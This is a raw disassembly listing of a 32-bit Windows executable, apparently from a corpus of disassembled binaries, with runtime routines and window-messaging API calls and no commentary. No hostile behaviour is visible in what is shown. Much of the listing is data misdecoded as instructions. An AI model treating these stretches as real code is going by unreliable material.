mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405c58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405cf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404038
mov eax ebx
xor edx edx
call sub_4048bc
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405cfe
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_4048b0
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404684
mov eax ebx
call sub_4048b0
push eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
inc eax
push eax
mov eax ebx
call sub_4048a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
pop ecx
pop edx
call sub_405a44
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404684
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40408c
sub_405d04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404744
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405da2
lea eax [ ebp - 0x4 ]
call sub_404744
retn
mov eax ebx
call sub_4042f8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40498c
mov eax ebx
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4048b0
inc eax
push eax
mov eax ebx
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4048a0
pop ecx
pop edx
call sub_405b20
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404744
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40498c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404780
sub_405da8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405deb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404890
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405c58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405df2
lea eax [ ebp - 0x4 ]
call sub_404744
retn
sub_405df8
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404230
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405330
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_404128
jmp r-xdata
sub_405e50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405eb6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4042a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402cdc
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ebd
lea eax [ ebp - 0x10 ]
call sub_404038
retn
xor ebx ebx
sub_405ec4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f0e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f15
retn
mov eax rw-data
call sub_402b18
mov eax rw-data
call sub_402b18
mov eax rw-data
call sub_402b18
call sub_401ad0
sub_405f18
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404e30
call sub_4030e8
test al al
je r-xdata
call sub_4031dc
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40131c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403118
call sub_40128c
call sub_405e50
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405e50
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_406020
push ebx
call sub_406018
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_40600c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_40402c
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_40402c
sub_406064
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_406020
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_4060b0
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405fec
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_4060a4
mov edx rw-data
mov eax ebx
call sub_403d80
pop ebx
retn
sub_4060f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406119
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406120
retn
sub_406150
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_40616c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406191
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406198
retn
sub_4061a4
test al 0x61
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
popad
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
arpl [ ecx ] cx
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
xor al 0x63
dec ecx
add [ ebx + 0x3025ffc0 ] cl
arpl [ ecx ] cx
mov eax eax
jmp [ EnterCriticalSection@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec ecx
add [ ebx + 0x2825ffc0 ] cl
arpl [ ecx ] cx
ja DeleteFileA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x4425ffc0 ] cl
arpl [ ecx ] cx
mov eax eax
jmp [ __import_lookup_table_6(kernel32:CreateEventA) ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je EnumCalendarInfoA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
pop eax
bound eax [ eax ]
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x3825ffc0 ] cl
arpl [ ecx ] cx
mov eax eax
jmp [ DeleteCriticalSection@IAT ]
mov eax eax
jmp [ FileTimeToDosDateTime@IAT ]
add esp [ ecx - 0x3f74ffc0 ]
sub_406d68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a70
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a60
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a70
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a60
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406e18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406f0d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406f35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f3c
retn
sub_406f48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406f6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f74
retn
sub_406f80
push esi
dec ecx
add al dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax + 0x640000ff ] dh
push esi
dec ecx
add [ ecx + 0x640000ff ] dh
push esi
dec ecx
add [ edx + 0x640000ff ] dh
push esi
dec ecx
add [ ebx + 0x640000ff ] dh
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] dh
dec ecx
add [ ebp + 0x640000ff ] dh
push esi
dec ecx
add [ esi + 0x640000ff ] dh
push esi
dec ecx
add [ edi + 0x640000ff ] dh
push esi
dec ecx
add [ eax + 0x640000ff ] bh
push esi
dec ecx
add [ ecx + 0x640000ff ] bh
push esi
dec ecx
add [ edx + 0x640000ff ] bh
push esi
dec ecx
add [ ebx + 0x640000ff ] bh
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] bh
dec ecx
add [ ebp + 0x640000ff ] bh
push esi
dec ecx
add [ esi + 0x640000ff ] bh
push esi
dec ecx
add [ edi + 0x640000ff ] bh
push esi
dec ecx
add [ eax + 0x640000ff ] ah
push esi
dec ecx
add [ ecx + 0x640000ff ] ah
push esi
dec ecx
add [ edx + 0x640000ff ] ah
push esi
dec ecx
add [ ebx + 0x640000ff ] ah
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] ah
dec ecx
add [ ebp + 0x640000ff ] ah
push esi
dec ecx
add [ esi + 0x640000ff ] ah
push esi
dec ecx
add [ edi + 0x640000ff ] ah
push esi
dec ecx
add [ eax + 0x640000ff ] ch
push esi
dec ecx
add [ ecx + 0x640000ff ] ch
push esi
dec ecx
add [ edx + 0x640000ff ] ch
push esi
dec ecx
add [ ebx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407285
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40728c
retn
sub_407298
pushfd
jb r-xdata
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xe004032 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ edx ] cl
or [ esi + eax * 2 + 0x69 ] edx
insb
dec esi
popad
insd
nop
hlt
add [ ebx + edi * 4 + 0x40 ] bl
add [ eax + 0xe004032 ] bl
inc ebp
dec eax
popad
jo r-xdata
outsd
outsb
adc al 0x73
inc eax
add [ edi ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
clc
js r-xdata
inc ebp
outsd
outsb
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004074 ] dl
dec edi
cmp [ eax + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] cl
inc eax
jb r-xdata
add [ eax ] al
nop
je r-xdata
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
je r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + eax * 2 ] dh
adc [ eax ] al
add [ eax ] al
test al 0x72
inc eax
add al dh
imul ebp [ edi + 0x6e ] 0x4073dc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jae r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xa004032 ] bl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
clc
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jne r-xdata
popad
insb
mov eax eax
call sub_40b515
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffbf8e ] ch
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x1040b535
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
je r-xdata
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ ebx + edi * 4 + 0x40 ] bl
add [ eax + 0xc004032 ] bl
inc ebp
dec edi
jne r-xdata
add [ eax ] dl
add [ eax ] al
add [ ebx + esi * 2 ] dh
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
add [ edx + esi + 0x40 ] bl
add [ eax + 0xb004032 ] bl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x9004032 ] bl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004075 ] ah
jb r-xdata
dec bp
insd
outsd
jb r-xdata
mov ebx 0x32980040
inc eax
add [ eax * 2 + 0x4f74754f ] cl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xb004032 ] bl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax - 0xfffbf8e ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jbe r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah bh
je r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x12004032 ] bl
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add ah bh
je r-xdata
shl [ eax + 0x4075 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax + 0x9004032 ] bl
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x100040 ] ch
add [ eax ] al
inc esp
je r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add ah bh
je r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40775c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
ja r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax + 0xc004032 ] bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xa004032 ] bl
inc ebp
dec ebp
popad
je r-xdata
